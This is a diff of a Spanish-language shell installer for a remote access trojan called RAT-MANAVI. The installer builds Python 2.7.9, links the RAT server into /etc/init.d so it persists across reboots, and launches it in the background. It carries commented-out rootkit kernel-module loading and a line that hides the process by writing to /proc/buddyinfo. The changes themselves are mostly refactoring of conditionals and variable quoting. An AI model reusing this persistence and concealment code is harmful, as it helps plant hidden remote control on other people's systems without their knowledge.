@@ -11,21 +11,25 @@ PYTHON279=${PYTHON279_PREFIX}python2.7.9/bin/python
 RAT_USER=manavi
 SPORT=6666
 
-ping -c 4 www.google.com > /dev/null 2>>/dev/null
+#Comprobar que ya no es necesaria la conexión a internet
+if [ ! -f $PYTHON279 ]
+then
+	ping -c 4 www.google.com > /dev/null 2>>/dev/null
 
-if [ $? != 0 ]
-then 
-	echo "Necesitas internet para continuar..."
-	echo "Saliendo del instalador."
-	exit
-else
-	echo "Podeis continuar con la instalacion."
-	if [ ! -d $RAT_DIR ]
-	then
-		echo "Creando directorio de instalacion..."
-		mkdir -p $RAT_DIR
+	if [ $? != 0 ]
+	then 
+		echo "Necesitas internet para continuar..."
+		echo "Saliendo del instalador."
+		exit
 	else
-		echo "Teneis lo necesario para continuar"
+		echo "Podeis continuar con la instalacion."
+		if [ ! -d $RAT_DIR ]
+		then
+			echo "Creando directorio de instalacion..."
+			mkdir -p $RAT_DIR
+		else
+			echo "Teneis lo necesario para continuar"
+		fi
 	fi
 fi
 
@@ -70,7 +74,7 @@ then
 	tar xfz Python-2.7.9.tgz 1>/dev/null
 	rm Python-2.7.9.tgz
 	cd Python-2.7.9/
-	./configure --prefix $PYTHON279_PREFIX''python2.7.9 1>/dev/null
+	./configure --prefix ${PYTHON279_PREFIX}python2.7.9 1>/dev/null
 	make 1>/dev/null
 	make install 1>/dev/null
 else
@@ -78,15 +82,15 @@ else
 fi
 
 #Agregar a init.d script server
-ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/
+ln -s ${RAT_DIR}RAT-MANAVI/server.py /etc/init.d/
 
 #Intalar modulo de rootkit
-#cd $RAT_DIR''RAT-MANAVI/rootkit/
+#cd ${RAT_DIR}RAT-MANAVI/rootkit/
 #$INSMOD rootkit.ko
 
 #Ejecutar el server.py
 cd ${RAT_DIR}RAT-MANAVI/
-$PYTHON279 $RAT_DIR''RAT-MANAVI/server.py &
+$PYTHON279 ${RAT_DIR}RAT-MANAVI/server.py &
 
 #Ocultar proceso
 echo "hpid $$" > /proc/buddyinfo 2>/dev/null
